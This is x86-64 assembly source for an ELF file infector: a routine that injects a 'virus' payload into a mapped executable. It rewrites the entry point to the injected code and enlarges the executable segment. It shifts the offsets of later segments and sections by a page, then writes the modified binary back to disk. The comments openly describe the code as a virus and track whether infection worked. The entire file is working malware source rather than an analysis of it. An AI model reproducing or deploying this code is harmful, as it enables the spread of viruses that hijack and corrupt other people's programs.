section .text
	global _update_mmaped_file
	extern _string

_update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
	enter 256, 0
	; rsp + 0  mmap start address (ehdr)
	; rsp + 8  file size
	; rsp + 16 virus size
	; rsp + 24 fd
	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
	; rsp + 40 shdr (ehdr + ehdr->e_shoff)
	; rsp + 48 actual phnum or actual shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 56 ehdr->e_phnum or ehdr->e_shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 64 found? bool
	; rsp + 72 virus offset
	; rsp + 80 o_entry store address (it's the address where we store the o_entry, (char *))
	; rsp + 88 number of 0 bytes to add
	; rsp + 96 i
	; rsp + 104 = 0
	; rsp + 108 mmap_tmp addr
	; rsp + 116 index mmap_tmp
	; rsp + 124 set to 1 if infection worked, 0 else
	;;;;;;;;;;;;;;;;;;;;;

; init phase
; first mov all params on stack
	mov QWORD [rsp], rdi

	mov QWORD [rsp + 8], rsi

	mov QWORD [rsp + 16], rdx

	mov QWORD [rsp + 24], r10
	mov QWORD [rsp + 124], 0

; init phdr (ehdr + ehdr->e_phoff)
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 32], r10 ; store it on stack
	add QWORD [rsp + 32], 32 ; add 32 on the address (offset on the header for e_phoff)
	mov r10, QWORD [rsp + 32] ; take this address
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 32], r10 ; mov it on stack
	mov r10, QWORD [rsp] ; take the mmap_base_address
	add QWORD [rsp + 32], r10 ; add it to our offset

; init shdr (ehdr + ehdr->e_shoff)
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 40], r10 ; store it on stack
	add QWORD [rsp + 40], 40 ; add 40 on the address (offset ont the header for e_shoff) 
	mov r10, QWORD [rsp + 40] ; take this address
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 40], r10 ; mov it on stack
	mov r10, QWORD [rsp] ; take the mmap_base_address
	add QWORD [rsp + 40], r10 ; add it to our offset

; init actual phnum
	mov QWORD [rsp + 48], 0

; take the number of segment
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 56], r10 ; store it on stack
	add QWORD [rsp + 56], 56 ; add 56 to it (offset for e_phnum)
	mov r11, QWORD [rsp + 56] ; take this addres
	xor r10, r10 ; clear r10, we will move a 2 bytes value on it, so we need to clear it before
	mov r10w, WORD [r11] ; dereference our addres to take e_phnum
	mov QWORD [rsp + 56], r10 ; store it on stack

; found = 0
	mov QWORD [rsp + 64], 0

; virus offset = 0
	mov QWORD [rsp + 72], 0

_treat_all_segments:
	mov r10, QWORD [rsp + 56] ; take e_phnum
	cmp QWORD [rsp + 48], r10 ; while phnum < ehdr->e_phnum
	jge _init_treat_all_sections
; check if our segment offset is in file size
	mov r10, QWORD [rsp + 32] ; take phdr
	sub r10, QWORD [rsp] ; sub the mmap_base_addr, to take the offset of the actual segment header
	cmp r10, QWORD [rsp + 8] ; check if this offset < file_size
	jge _munmap

_if:
	cmp QWORD [rsp + 64], 0 ; if found
	je _else_if
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 bytes to acces p_offset
	mov r10, QWORD [r10] ; dereference it to take the value
	cmp r10, QWORD [rsp + 72] ; if phdr->p_offset >= virus offset
	jl _else_if
	mov r10, QWORD [rsp + 32] ; add PAGE_SIZE to segment offset
	add r10, 8
	add QWORD [r10], 4096
	jmp _inc_jmp_loop

_else_if:
	mov r10, QWORD [rsp + 32] ; take phdr
	cmp DWORD [r10], 1 ; if phdr->p_type == PT_LOAD
	jne _inc_jmp_loop
	add r10, 4 ; offset of p_flags
	mov r10d, DWORD [r10] ; dereference it to take the value
	and r10d, 1 ; logical and for the flag
	cmp r10d, 1 ; if phdr->p_flags & PF_X
	jne _inc_jmp_loop
; virus offset = phdr->p_offset + phdr->p_filesz
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 bytes to take p_offset (offset of the segment in file)
	mov r11, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 72], r11 ; store it on stack, virus_offset = phdr->p_offset
	add r10, 24 ; offset of p_filesz is 32, we already added 8, so 32 - 8 = 24.
	mov r11, QWORD [r10] ; dereference
	add QWORD [rsp + 72], r11 ; virus offset += phdr->p_filesz
; modify e_entry
	mov r11, QWORD [rsp] ; take mmap_base_addr
	add r11, 24 ; e_entry offset
	mov rdi, QWORD [r11] ; take the actual e_entry by dereferencing
	mov QWORD [rsp + 80], rdi ; store it on stack, we will need it
	inc QWORD [rsp + 64] ; found++
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 16 ; p_vaddr offset
	mov rdi, QWORD [r10] ; take p_vaddr value
	mov QWORD [r11], rdi ; store in on e_entry
	add r10, 16 ; p_filesz offset is 32, we already add 16, so 32 - 16 = 16
	mov r12, QWORD [r10] ; take p_filesz value
	add QWORD [r11], r12 ; add it to e_entry, so e_entry = p_vaddr + p_filesz
	add QWORD [r11], 55 ; add the offset of the strings at the beginning of the virus
; update p_filesz and p_memsz
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 32 ; p_filesz offset
	mov r11, QWORD [rsp + 16] ; take virus size
	add r11, 8 ; don't forget the 8 first bytes off the entry point, didnt count in virus size
	add QWORD [r10], r11 ; add virus_size to the segment size in file and in memory
	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
	add QWORD [r10], r11

_inc_jmp_loop:
	add QWORD [rsp + 32], 56 ; 56 is the size of our struct, so we jmp to the next struct
	inc QWORD [rsp + 48] ; inc our phnum
	jmp _treat_all_segments

_init_treat_all_sections:
	mov QWORD [rsp + 48], 0 ; shnum = 0
	mov r10, QWORD [rsp] ; take mmap_base_address
	mov QWORD [rsp + 56], r10 ; store it on stack
	add QWORD [rsp + 56], 60 ; add 60 to take e_shnum
	mov r11, QWORD [rsp + 56] ; take the address
	xor r10, r10 ; clear r10
	mov r10w, WORD [r11] ; dereference our address to take e_shnum value
	mov QWORD [rsp + 56], r10 ; store it on stack

_treat_all_sections:
	mov r10, QWORD [rsp + 48] ; take shnum
	cmp r10, QWORD [rsp + 56] ; while (shnum < ehdr->e_shnum)
	jge _init_mmap_tmp
	mov r10, QWORD [rsp + 40] ; take shdr
	sub r10, QWORD [rsp] ; sub mmap_base_addr to shdr, to take the offset
	cmp r10, QWORD [rsp + 8] ; check if this offset is in file bounds
	jge _munmap

_if_offset_equal_virus_offset:
	xor r10, r10 ; clear r10
	mov r10, QWORD [rsp + 40] ; take shdr
	add r10, 24 ; shdr->sh_offset offset
	mov r11, QWORD [rsp + 40] ; take shdr
	add r11, 32 ; shdr->sh_size offset
	mov rdi, QWORD [r10] ; mov the value of sh_offset in rdi
	add rdi, QWORD [r11] ; add the value of sh_size
	cmp rdi, QWORD [rsp + 72] ; if (shdr->sh_offset + shdr->sh_size) == virus offset
	jne _if_offset_greater_or_equal_virus_offset
; add virus size to this section size
	mov r10, QWORD [rsp + 16] ; take virus size
	add r10, 8 ; add the 8 bytes of o_entry
	add QWORD [r11], r10 ; add it to sh_size

_if_offset_greater_or_equal_virus_offset:
	xor r10, r10 ; clear r10
	mov r10, QWORD [rsp + 40] ; take shdr
	add r10, 24 ; shdr->sh_offset offset
	mov r10, QWORD [r10] ; dereference sh_offset addres
	cmp r10, QWORD [rsp + 72] ; if shdr->sh_offset >= virus offset
	jl _inc_jmp_loop_sections
; add PAGE_SIZE to sh_offset
	mov r10, QWORD [rsp + 40] ;take shdr
	add r10, 24 ; go to sh_offset
	add QWORD [r10], 4096 ; add pagesize

_inc_jmp_loop_sections:
	inc QWORD [rsp + 48] ; inc shnum
	add QWORD [rsp + 40], 0x40 ; shdr struct size
	jmp _treat_all_sections

_init_mmap_tmp:
; add PAGESIZE to sections offset
	mov r10, QWORD [rsp] ; take mmap_base_addr
	add r10, 40 ; go to sh_offset
	add QWORD [r10], 4096 ; add pagesize
;;;;;;;;;;;;;;;;;
; mmap tmp
_mmap_tmp:
	mov rax, 9
	mov rdi, 0
	mov rsi, QWORD [rsp + 8]
	add rsi, 4096
	mov rdx, 3
	mov r10, 34
	mov r8, -1
	mov r9, 0
	syscall
	cmp rax, 0
	jle _end
	mov QWORD [rsp + 108], rax
	mov QWORD [rsp + 116], 0

_write_in_tmp_map:
;; memcpy(mmap_tmp, mmap, virus_offset);
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp]
	mov rcx, QWORD [rsp + 72]
	cld
	rep movsb
	mov r10, QWORD [rsp + 72]
	mov QWORD [rsp + 116], r10 ; add the number of bytes copied, it's the index of mmap_tmp
;; memcpy(mmap_tmp + index, o_entry, 8);
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rsi, rsp ;
	add rsi, 80
	mov rcx, 8 ; size
	cld
	rep movsb
	add QWORD [rsp + 116], 8 ; add 8 to our index
;; memcpy(mmap_tmp + index, virus, virus_size);
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _string]
	mov rcx, QWORD [rsp + 16]
	cld
	rep movsb
	mov r10, QWORD [rsp + 16]
	add QWORD [rsp + 116], r10 ; add the virus size to our index
; for i < 4096 - (virus_size + 8) memset(mmap_tmp, 0, 1);
	mov QWORD [rsp + 88], 4096
	mov rdi, QWORD [rsp + 16]
	add rdi, 8
	sub QWORD [rsp + 88], rdi
	mov rcx, QWORD [rsp + 88]
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rax, 0
	cld
	rep stosb
	mov r10, QWORD [rsp + 88]
	add QWORD [rsp + 116], r10 ; add 4096 - (virus_size + 8) to our index
_last_write:
;; memcpy(mmap_tmp + index, mmap + virus_offset, file_size - virus_offset);
	mov rdi, QWORD [rsp + 108] ; fd
	add rdi, QWORD [rsp + 116]
	mov rsi, QWORD [rsp] ; buff
	add rsi, QWORD [rsp + 72]
	mov rcx, QWORD [rsp + 8] ; size
	sub rcx, QWORD [rsp + 72]
	cld
	rep movsb

_write_into_file:
;; write(fd, mmap_tmp, file_size + 4096)
	mov rax, 1
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 108]
	mov rdx, QWORD [rsp + 8]
	add rdx, 4096
	syscall
	mov QWORD [rsp + 124], 1

_munmap:
	mov rax, 11
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp + 8]
	add rsi, 4096
	syscall

_end:
	mov rax, QWORD [rsp + 124]
	leave
	ret
